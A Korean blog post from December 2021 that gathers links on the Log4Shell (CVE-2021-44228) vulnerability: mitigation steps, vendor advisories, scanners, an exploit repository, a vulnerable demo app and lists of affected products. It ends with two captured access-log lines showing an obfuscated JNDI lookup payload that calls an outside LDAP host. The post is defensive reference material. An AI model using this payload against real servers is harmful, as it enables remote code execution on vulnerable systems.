---
title: "log4shell - url 정리"
date: 2021-12-11T23:49:25+09:00
draft: false
categories: ["Linux"]
slug: "log4jshell-url-정리"
aliases:
  - /log4jshell-url-정리/
  - /log4jshell-url-%ec%a0%95%eb%a6%ac/
---

\n

총평: log4shell 취약점이 있으면 해커가 서버에서 뭐든할수있게 되어서 랜섬부터 멀웨어까지 다양하고 참신한 공격이 가능

\n\n\n\n

1 . "log4j2.formatMsgNoLookups"를 "true"로 설정

\n\n\n\n

2. Log4j 2.15.0(https://logging.apache.org/log4j/2.x/download.html) 버전으로 업데이트

\n\n\n\n

<https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389>

\n\n\n\n

대응방법 KISA

\n\n\n\n

<https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j>

\n\n\n\n

패스틀리 링크

\n\n\n\n

<https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/>

\n\n\n\n

클라우드플레어링크

\n\n\n\n

<https://www.pcmag.com/news/countless-serves-are-vulnerable-to-apache-log4j-zero-day-exploit>

\n\n\n\n

취약점 테스트방법

\n\n\n\n

<https://github.com/mwarnerblu/Log4ShellScanner>

\n\n\n\n

Log4shell Scanner

\n\n\n\n

<https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce>

\n\n\n\n

취약점 점검 expolit

\n\n\n\n

<https://www.lunasec.io/docs/blog/log4j-zero-day/>

\n\n\n\n

curl 테스트방법

\n\n\n\n

<https://gist.github.com/nathanqthai/01808c569903f41a52e7e7b575caa890>

\n\n\n\n

로깅패턴

\n\n\n\n

<https://www.picussecurity.com/resource/blog/simulating-and-preventing-cve-2021-44228-apache-log4j-rce-exploits>

\n\n\n\n

로그에서 확인방법

\n\n\n\n

<https://github.com/YfryTchsGD/Log4jAttackSurface>

\n\n\n\n

대상제품리스트

\n\n\n\n

<https://aws.amazon.com/ko/security/security-bulletins/AWS-2021-005/?fbclid=IwAR1j7GAuBIbuh7HrlQJO-HTTKFjac7YYxvSWVh950CWiav2vO6AzSTI-S_0>

\n\n\n\n

AWS의 대응 WAF에 Managed rule이 추가

\n\n\n\n

<https://github.com/YfryTchsGD/Log4jAttackSurface>

\n\n\n\n

공격받은곳 리스트

\n\n\n\n

<https://github.com/christophetd/log4shell-vulnerable-app>

\n\n\n\n

동작샘플

\n\n\n\n

블로그에 남은 공격로그

\n\n\n\n

127.0.0.6 - - [12/Dec/2021:04:29:32 +0000] "GET /favicon.ico HTTP/1.1" 302 5 "-" "${**jndi**:${lower:l}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}" "68.183.198.247"

\n\n\n\n

127.0.0.6 - - [12/Dec/2021:04:29:33 +0000] "GET /wp-includes/images/w-logo-blue-white-bg.png HTTP/1.1" 200 4119 "-" "${**jndi**:${lower:l}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}" "68.183.198.247"

\n